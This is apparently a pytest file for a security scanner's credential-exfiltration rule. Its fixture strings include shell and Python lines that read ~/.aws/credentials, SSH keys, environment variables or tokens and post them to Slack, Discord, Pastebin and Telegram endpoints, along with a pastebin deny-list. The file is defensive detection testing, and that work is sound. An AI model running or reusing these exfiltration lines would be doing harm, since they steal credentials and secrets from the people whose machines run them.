"""The two halves of `SUSPECT.EXFIL.DROP_POINT.001`, read by the tree (reviews/pypi-98/21): text is not a read,
a destination only named is not where anything is sent, and a setting is judged by the tree. Each quiet
shape has a twin that keeps the rule firing. Hosts are the real drop points the rule exists for; the
fixtures send nothing anywhere: they are scanned, never run."""

from __future__ import annotations

import pytest

from cordon_scanner import Scanner
from cordon_scanner.foundation.config.settings import Config

RULE = "SUSPECT.EXFIL.DROP_POINT.001"
HOOK = "https://hooks.slack.com/services/T0000000/B0000000/XXXXXXXXXXXXXXXXXXXXXXXX"


class Kit:
    @staticmethod
    def fires(tmp_path, source: str, name: str = "tool.py") -> bool:
        (tmp_path / name).write_text(source, encoding="utf-8")
        result = Scanner(Config.default().with_overrides(use_cache=False)).scan(tmp_path)
        return any(f.rule_id == RULE for f in result.findings)


class TestTextIsNotARead:
    NOTIFIER = (
        "import requests\n"
        "PATTERNS = '''\n"
        "cat ~/.aws/credentials\n"
        "cat ~/.ssh/id_rsa\n"
        "'''\n"
        "def notify(text):\n"
        f'    requests.post("{HOOK}", json={{"text": text}})\n'
    )

    def test_a_block_of_text_naming_stores_beside_a_notifier_is_quiet(self, tmp_path) -> None:
        assert not Kit.fires(tmp_path, self.NOTIFIER)

    @pytest.mark.parametrize(
        "source",
        [
            f'import os\nos.system("cat ~/.aws/credentials | curl -d @- {HOOK}")\n',
            f"import os\nos.system('''\ncat ~/.aws/credentials | curl -d @- {HOOK}\n''')\n",
            "import subprocess\n"
            f"CMD = '''\ncat ~/.aws/credentials | curl -d @- {HOOK}\n'''\n"
            "subprocess.run(CMD, shell=True)\n",
            "def go():\n    exec('''\n"
            f'import urllib.request as u; u.urlopen("{HOOK}", open(".aws/credentials", "rb").read())\n'
            "''')\n",
            "import requests\ndef go(home):\n"
            f'    requests.post("{HOOK}", data=open(f"{{home}}/.aws/credentials").read())\n',
            "import requests, os\ndef go():\n"
            f'    requests.post("{HOOK}", data=open(os.path.expanduser("~/.aws/credentials")).read())\n',
        ],
        ids=[
            "os.system string",
            "multi-line os.system string",
            "multi-line string run through a name",
            "multi-line exec string",
            "f-string expression",
            "a store path opened",
        ],
    )
    def test_a_string_that_is_run_or_a_path_that_is_opened_keeps_it(self, tmp_path, source) -> None:
        assert Kit.fires(tmp_path, source)

    def test_a_file_that_does_not_parse_keeps_the_text_reading(self, tmp_path) -> None:
        assert Kit.fires(tmp_path, "def (:\n" + self.NOTIFIER)

    def test_a_template_is_not_code(self, tmp_path) -> None:
        page = (
            f"<p>Copy ~/.aws/credentials to {HOOK}</p>\n"
            "<script>var k = 'cat ~/.aws/credentials';</script>\n"
        )
        assert not Kit.fires(tmp_path, page, "index.html")

    def test_a_shell_script_with_the_same_text_is_code(self, tmp_path) -> None:
        script = f"#!/bin/sh\ncat ~/.aws/credentials | curl -d @- {HOOK}\n"
        assert Kit.fires(tmp_path, script, "run.sh")


class TestADestinationOnlyNamed:
    LOOT = "import os\ndef env():\n    return dict(os.environ)\n"

    @pytest.mark.parametrize(
        "named",
        [
            'DENY = frozenset({"pastebin.com"})\ndef allowed(host):\n    return host not in DENY\n',
            "def check(url):\n"
            '    raise ValueError("send the report to https://discord.com/api/webhooks/1/x")\n',
            'def help():\n    print("paste your output at https://paste.rs")\n',
        ],
        ids=["a deny-list", "an exception message", "a printed message"],
    )
    def test_a_host_that_is_a_message_or_a_deny_list_is_quiet(self, tmp_path, named) -> None:
        assert not Kit.fires(tmp_path, self.LOOT + named)

    @pytest.mark.parametrize(
        "sent",
        [
            "import requests\n"
            'HOOK = "https://discord.com/api/webhooks/1/x"\n'
            "requests.post(HOOK, data=dict(os.environ))\n",
            "import requests\n"
            'CFG = {"hook": "https://discord.com/api/webhooks/1/x"}\n'
            'requests.post(CFG["hook"], data=dict(os.environ))\n',
            "import urllib.request as u\n"
            'HOOKS = ["https://discord.com/api/webhooks/1/x", "https://pastebin.com/api/post"]\n'
            "for h in HOOKS:\n"
            "    u.urlopen(u.Request(h, data=repr(dict(os.environ)).encode()))\n",
            "import requests\n"
            "class Sink:\n"
            '    url = "https://discord.com/api/webhooks/1/x"\n'
            "    def go(self):\n"
            "        requests.post(self.url, data=dict(os.environ))\n",
        ],
        ids=["a constant", "a dict item", "an iterated list", "a class attribute"],
    )
    def test_a_host_that_reaches_a_request_or_is_not_resolved_fires(self, tmp_path, sent) -> None:
        assert Kit.fires(tmp_path, self.LOOT + sent)

    def test_a_message_through_a_class_the_file_defines_is_not_a_message(self, tmp_path) -> None:
        source = (
            self.LOOT + "import requests\n"
            "class SendError(Exception):\n"
            "    def __init__(self, url):\n"
            "        requests.post(url, data=dict(os.environ))\n"
            "def go():\n"
            '    raise SendError("https://discord.com/api/webhooks/1/x")\n'
        )
        assert Kit.fires(tmp_path, source)


class TestASettingReadByTheTree:
    BOT = '"https://api.telegram.org/bot%s/sendMessage" % tok'

    def notifier(self, body: str) -> str:
        return f"import os, requests\n{body}\n    requests.post({self.BOT}, json={{'text': t}})\n"

    def test_a_helper_every_call_of_which_passes_a_literal_is_quiet(self, tmp_path) -> None:
        source = self.notifier(
            "def _env(name):\n    return os.environ.get(name)\n"
            "def notify(t):\n    tok = _env('TG_TOKEN'); chat = _env('TG_CHAT')"
        )
        assert not Kit.fires(tmp_path, source)

    @pytest.mark.parametrize(
        "body",
        [
            "def _env(name):\n    return os.environ.get(name)\n"
            "def notify(t, k):\n    tok = _env(k)",
            "NAMES = ('TG_TOKEN', 'NPM_TOKEN')\n"
            "def notify(t):\n    cfg = {n: os.environ.get(n) for n in NAMES}\n    tok = cfg['TG_TOKEN']",
            "def _env(name):\n    return os.environ.get(name)\n"
            "def notify(t):\n    tok = _env('TG_TOKEN'); other = _env('NPM_TOKEN')",
        ],
        ids=[
            "a name from outside",
            "a credential name in the list",
            "a helper called once with a credential name",
        ],
    )
    def test_an_unbounded_name_or_a_credential_fires(self, tmp_path, body) -> None:
        assert Kit.fires(tmp_path, self.notifier(body))
